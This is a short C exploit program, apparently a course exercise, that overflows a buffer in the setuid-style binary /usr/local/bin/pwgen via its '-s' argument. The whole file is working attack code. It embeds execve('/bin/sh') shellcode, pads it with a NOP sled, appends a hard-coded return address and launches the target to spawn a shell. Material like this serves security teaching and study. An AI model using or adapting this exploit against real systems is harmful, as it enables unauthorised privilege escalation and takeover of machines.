/*
 * sploit1.c buffer overflow
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define TARGET "/usr/local/bin/pwgen"

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(void)
{
  char *args[4];
  char *env[1];
  int i = 0;

  args[0] = TARGET;
  args[1] = "-s";

  args[2] = malloc(sizeof(char)*600);
  for (i = 0; i < strlen(shellcode); ++i){
    args[2][i] = shellcode[i];
  }

  for(; i<(strlen(shellcode)+511);i++){
    args[2][i] = '\x90';
  }
  args[2][i] = '\xd0';
  args[2][i+1] = '\xd7';
  args[2][i+2] = '\xbf';
  args[2][i+3] = '\xff';
  args[2][i+4] = '\0';

  args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0){
    fprintf(stderr, "%d\n", errno);
  }
  exit(0);
}
